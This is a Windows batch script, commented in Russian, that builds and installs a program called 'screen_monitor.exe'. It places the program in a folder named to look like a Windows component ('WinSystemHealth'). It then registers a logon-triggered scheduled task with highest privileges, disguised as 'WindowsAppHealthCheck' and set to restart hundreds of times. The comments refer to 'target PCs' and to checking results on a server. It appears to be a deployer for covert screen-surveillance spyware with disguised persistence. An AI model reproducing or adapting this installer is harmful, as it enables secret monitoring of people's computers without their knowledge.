:: На целевых ПК можно не запускать!

@echo off
cd /d "%~dp0"
setlocal enabledelayedexpansion

set "EXE_NAME=screen_monitor.exe"
set "INSTALL_DIR=%PROGRAMDATA%\WinSystemHealth"
set "TASK_NAME=WindowsAppHealthCheck"

echo === 1. Поиск Visual Studio ===

set "VS_WHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist "!VS_WHERE!" (
    echo [ERROR] vswhere.exe не найден.
    pause
    exit /b
)

for /f "usebackq tokens=*" %%i in (`"!VS_WHERE!" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set "VS_PATH=%%i"
)

if "!VS_PATH!"=="" (
    echo [ERROR] Visual Studio не найдена.
    pause
    exit /b
)

echo Найдена VS по пути: !VS_PATH!

set "VCVARS=!VS_PATH!\VC\Auxiliary\Build\vcvars64.bat"
if not exist "!VCVARS!" (
    echo [ERROR] vcvars64.bat не найден. Проверьте установку компонентов C++.
    pause
    exit /b
)

call "!VCVARS!"

echo === 2. Сборка автономного EXE ===
if exist build rmdir /s /q build
mkdir build
cd build

cmake .. -DCMAKE_BUILD_TYPE=Release

cmake --build . --config Release

if not exist "Release\%EXE_NAME%" (
    if exist "%EXE_NAME%" (
        set "RESULT_PATH=%EXE_NAME%"
    ) else if exist "Release\%EXE_NAME%" (
        set "RESULT_PATH=Release\%EXE_NAME%"
    ) else (
        echo [ERROR] Сборка не удалась. EXE не найден.
        pause
        exit /b
    )
) else (
    set "RESULT_PATH=Release\%EXE_NAME%"
)

echo === 3. Установка в систему ===
cd /d "%~dp0"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
taskkill /f /im %EXE_NAME% >nul 2>&1
copy /y "build\!RESULT_PATH!" "%INSTALL_DIR%\%EXE_NAME%"

echo === 4. Создание задачи ===
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /tn "%TASK_NAME%" /tr "'%INSTALL_DIR%\%EXE_NAME%'" /sc onlogon /rl highest /f

powershell -Command "Set-ScheduledTask -TaskName '%TASK_NAME%' -Settings (New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1))"

echo === 5. Запуск ===
::schtasks /run /tn "%TASK_NAME%"

echo ГОТОВО! Проверьте результат на сервере.
pause